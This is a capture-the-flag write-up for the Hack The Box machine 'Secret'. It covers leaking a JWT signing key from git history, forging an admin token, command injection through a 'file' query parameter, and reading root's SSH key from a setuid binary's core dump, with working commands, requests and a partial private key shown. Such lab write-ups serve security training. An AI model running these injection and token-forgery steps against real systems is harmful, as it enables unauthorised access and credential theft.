---
tags:
  - linux
---
# HTB: [Secret](https://app.hackthebox.com/machines/Secret)

> [!tip]- **Spoiler summary**
> - Exposed **files.zip** → Git history leak → `.env` with JWT signing key
> - Forged admin JWT → `/api/logs`
> - Command‑injection in `git log --oneline <file>` → shell as `dasith` (admin user)
> - *setuid* binary `/opt/count` + core‑dump abuse → `/root/.ssh/id_rsa`

## Enumeration

### `nmap`

#### TCP

- Target: `secret.htb 10.10.11.120`
- Command: `nmap -v --reason -Pn -T4 -p- --open -sCV -oA nmap_tcp-secret.htb secret.htb`

##### 80/tcp-http `nginx` `1.18.0` `(Ubuntu)`

```text
__http-title:
DUMB Docs
__http-methods:
  Supported Methods: GET HEAD POST OPTIONS
__http-server-header:
nginx/1.18.0 (Ubuntu)
```

##### 3000/tcp-http `Node.js` `(Express middleware)`

```text
__http-title:
DUMB Docs
__http-methods:
  Supported Methods: GET HEAD POST OPTIONS
```

### Manual Enumeration

From the landing page:

![](_/htb-secret-20250417-1.png)

The site documents a REST API and allows self‑registration.

Registering a user:

```http
POST /api/user/register
Accept: */*
Host: secret.htb:3000
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 64

{"name": "haxhax", "email": "hax@hax.com", "password": "haxhax"}
```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 17
ETag: W/"11-4bGC2xrq1KBu1a10HuTshGBxELw"
Date: Thu, 17 Apr 2025 20:24:21 GMT
Connection: keep-alive

{"user":"haxhax"}
```

```http
POST /api/user/login
Accept: */*
Host: secret.htb:3000
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 46

{"email": "hax@hax.com", "password": "haxhax"}
```

```http
HTTP/1.1 200 OK
X-Powered-By: Express
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2ODAxNjM3NWFlZDVjZjA0NWUyZDkwN2QiLCJuYW1lIjoiaGF4aGF4IiwiZW1haWwiOiJoYXhAaGF4LmNvbSIsImlhdCI6MTc0NDkyMTUxNn0.Np9WjeVQ06g8gy4PW9TBuK9HSNux9NgDAcmVWTIyMms
Content-Type: text/html; charset=utf-8
Content-Length: 200
ETag: W/"c8-bZHQ/aqsRkw9byPUAy2S6CAa8UE"
Date: Thu, 17 Apr 2025 20:25:16 GMT
Connection: keep-alive

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2ODAxNjM3NWFlZDVjZjA0NWUyZDkwN2QiLCJuYW1lIjoiaGF4aGF4IiwiZW1haWwiOiJoYXhAaGF4LmNvbSIsImlhdCI6MTc0NDkyMTUxNn0.Np9WjeVQ06g8gy4PW9TBuK9HSNux9NgDAcmVWTIyMms
```

A `feroxbuster` scan revealed `http://secret.htb:3000/download/files.zip`, which contains a Git repo. The history contains a `.env` file.

```console
$ unzip files.zip
...

$ cd local-web/

$ git status
On branch master
nothing to commit, working tree clean

$ git log
...
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons
...
```

```console
$ git log -p 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons
...
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
...
```

That's the key used for signing the API authentication tokens. Here I verify the `auth-token` created for the unprivileged user above:

```json
$ jwt -alg HS256 -verify <(echo -n "$TOK") -key <(echo -n "$KEY")
{
    "_id": "68016375aed5cf045e2d907d",
    "email": "hax@hax.com",
    "iat": 1744921516,
    "name": "haxhax"
}
```

Forging a token using the HS256 key:

```console
$ jwt -alg HS256 -sign + \
     -key <(printf '%s' "$KEY") \
     -claim _id=68016790aed5cf045e2d9085 \
     -claim name=haxhax2 \
     -claim email=haxhax2@hax.com \
     -claim role=admin
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2ODAxNjc5MGFlZDVjZjA0NWUyZDkwODUiLCJlbWFpbCI6ImhheGhheDJAaGF4LmNvbSIsIm5hbWUiOiJoYXhoYXgyIiwicm9sZSI6ImFkbWluIn0.89L1yBPdEKg9bS-jBUlOXs--LEcfvTJLKRz0cER8TOg

$ TOK='eyJhbG....`

$ jwt -alg HS256 -verify <(echo -n "$TOK") -key <(echo -n "$KEY")
{
    "_id": "68016790aed5cf045e2d9085",
    "email": "haxhax2@hax.com",
    "name": "haxhax2",
    "role": "admin"
}
```

But the `role` claim I added doesn't work:

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 56
ETag: W/"38-ek0dt33YGQS3RTohPHA3ae5v5cE"
Date: Thu, 17 Apr 2025 21:23:22 GMT
Connection: keep-alive

{"role":{"role":"you are normal user","desc":"haxhax2"}}
```

## Remote Code Execution

The previous forged token didn't work, so I try another one with admin details leaked from the documentation on the web page:

![](_/htb-secret-20250417-2.png)

```console
$ jwt -alg HS256 -sign + -key <(echo -n "$KEY") -claim _id=6114654d77f9a54e00f05777 -claim name=theadmin -claim email=root@dasith.works -claim role=admin
eyJhbGceyJfaWQiOiI2M...
```

That one worked:

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 76
ETag: W/"4c-bXqVw5XMe5cDkw3W1LdgPWPYQt0"
Date: Thu, 17 Apr 2025 21:26:11 GMT
Connection: keep-alive

{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```

Browsing the Git repo, I found an endpoint called `/api/logs` which accepts a `file` parameter via `GET` and runs `git log --oneline <file>`. A simple command injection worked for RCE:

```console
$ curl -H "auth-token: $TOK" http://secret.htb:3000/api/logs?file=foo%3bid
"uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n"
```

## Privilege Escalation

There is a *setuid* binary and other interesting information:

```console
dasith@secret:/opt$ ls -la /opt
total 56
drwxr-xr-x  2 root root  4096 Oct  7  2021 .
drwxr-xr-x 20 root root  4096 Oct  7  2021 ..
-rw-r--r--  1 root root 16384 Oct  7  2021 .code.c.swp
-rw-r--r--  1 root root  3736 Oct  7  2021 code.c
-rwsr-xr-x  1 root root 17824 Oct  7  2021 count
-rw-r--r--  1 root root  4622 Oct  7  2021 valgrind.log

dasith@secret:~$ file /opt/count
/opt/count: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=615b7e12374cd1932161a6a9d9a737a63c7be09a, for GNU/Linux 3.2.0, not stripped
dasith@secret:~$ /opt/count
Enter source file/directory name: /tmp
drwx------      systemd-private-3bd0c9d821e6447692eca913abad8579-systemd-logind.service-ZZYWnh
drwxrwxrwx      .ICE-unix
drwxr-xr-x      ..
drwx------      vmware-root_726-2957583432
drwx------      systemd-private-3bd0c9d821e6447692eca913abad8579-systemd-timesyncd.service-PvjHWg
drwxrwxrwx      .Test-unix
drwx------      systemd-private-3bd0c9d821e6447692eca913abad8579-systemd-resolved.service-ixmsog
drwx------      snap.lxd
drwxrwxrwx      .font-unix
drwxrwxrwx      .XIM-unix
drwxrwxrwx      .X11-unix
drwxrwxrwx      .

Total entries       = 12
Regular files       = 0
Directories         = 12
Symbolic links      = 0
Save results a file? [y/N]: y
Path: /tmp/foo
dasith@secret:~$ ls -l /tmp
total 24
-rw-rw-r-- 1 dasith dasith   98 Apr 17 21:41 foo
...
```

Here's `main` from `code.c`:

```c
int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
```

I tried several different tricks to leverage that file read into something I could access as the unprivileged user. However, `gdb`, `strace`, and even `/proc/$pid/fd/*` don't allow it. I considered a buffer overflow but doubted it would be the vector for an Easy-rated HTB target. After looking more closely at the C code, I realized that this line allows the unprivileged user to read a core dump:

```text
// Enable coredump generation
prctl(PR_SET_DUMPABLE, 1);
printf("Save results a file? [y/N]: ");
```

`kernel.core_pattern` is configured to send core dumps to [Apport](https://wiki.ubuntu.com/Apport):

```console
dasith@secret:~$ sysctl kernel.core_pattern
kernel.core_pattern = |/usr/share/apport/apport %p %s %c %d %P %E
```

I made sure that `ulimit` is set correctly:

```console
dasith@secret:~$ ulimit -c
0
dasith@secret:~$ ulimit -c unlimited  # This may be unnecessary with Apport.
dasith@secret:~$ ulimit -c
unlimited
```

Then I ran `count` on `/root/.ssh/id_rsa` and at the "Save results…" prompt I ran `kill -SEGV $pid` from another shell. It worked:

```console
dasith@secret:~$ ls -l /var/crash
total 32
-rw-r----- 1 dasith dasith 31507 Apr 17 22:53 _opt_count.1000.crash
dasith@secret:~$ file /var/crash/_opt_count.1000.crash
/var/crash/_opt_count.1000.crash: ASCII text, with very long lines
dasith@secret:~$ head /var/crash/_opt_count.1000.crash
ProblemType: Crash
Architecture: amd64
Date: Thu Apr 17 22:53:20 2025
DistroRelease: Ubuntu 20.04
ExecutablePath: /opt/count
ExecutableTimestamp: 1633601037
ProcCmdline: /opt/count
ProcCwd: /
ProcEnviron:
 SHELL=/bin/bash
```

Within that crash file are two uuencoded lines. I used Vim to isolate them and clean them up (removed spaces). Then I decoded and saved the data into a file, which is a `gzip`'d core dump:

```console
$ cat line1 line2 | base64 -d > core.gz

$ gunzip core.gz

$ file core
core: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from '/opt/count', real uid: 1000, effective uid: 0, real gid: 1000, effective gid: 1000, execfn: '/opt/count', platform: 'x86_64'
```

I could have used `gdb` to pull the file buffer out, but `strings` works just fine:

```console
$ strings core
XC&V
CORE
XC&V
...
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3
KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+
...
```

I saved the key and it worked for `root`:

```console
$ ssh -i id.root root@secret.htb
...
Last login: Tue Oct 26 15:13:55 2021
root@secret:~#
```

## Lessons

### `HS256` Key

`TOKEN_SECRET` in the leaked `.env` file is a raw 256‑bit value. The backend signs and verifies all JSON Web Tokens with HS256 (HMAC‑SHA‑256), which is a symmetric algorithm: the same key both generates and validates the signature. Whoever knows that key can forge a token with arbitrary claims (`role: admin`, etc.) that the server will accept as genuine: no private–public key pair is involved, so there is no separate verification secret.

### Apport, `PR_SET_DUMPABLE`, and *setuid*

- **Default behavior:** A setuid program runs with elevated privileges, so the kernel marks it _non‑dumpable_ to prevent core files from exposing sensitive memory.
- **`prctl(PR_SET_DUMPABLE, 1)`:** This call in `code.c` reverses that protection. After privileges drop with `setuid(getuid())`, the process becomes dumpable again even though it started as `root`.
- **Apport handler:** Ubuntu’s `kernel.core_pattern` is set to `|/usr/share/apport/apport …`, which pipes any core to the Apport utility. Apport writes a text crash file in `/var/crash/`, owned by the crashing user.
- **Impact:** When the setuid helper crashes (e.g., forced `SIGSEGV`), the resulting `crash` file contains a uuencoded core that still holds the program’s original root‑level memory, including file buffers such as the one containing `/root/.ssh/id_rsa`. This allows an unprivileged user to read files owned by `root`.
- **Apport bypasses `ulimit`**: When `kernel.core_pattern` starts with a pipe (`|`), the kernel streams the core image directly to the helper (Apport) regardless of the core‑size limit for the process. So, setting it to `unlimited` above wasn't really necessary.

### Methodology

I could have saved a lot of time if I had been more careful reading `code.c`. That `PR_SET_DUMPABLE` line and comment was a huge hint that I missed on my first pass.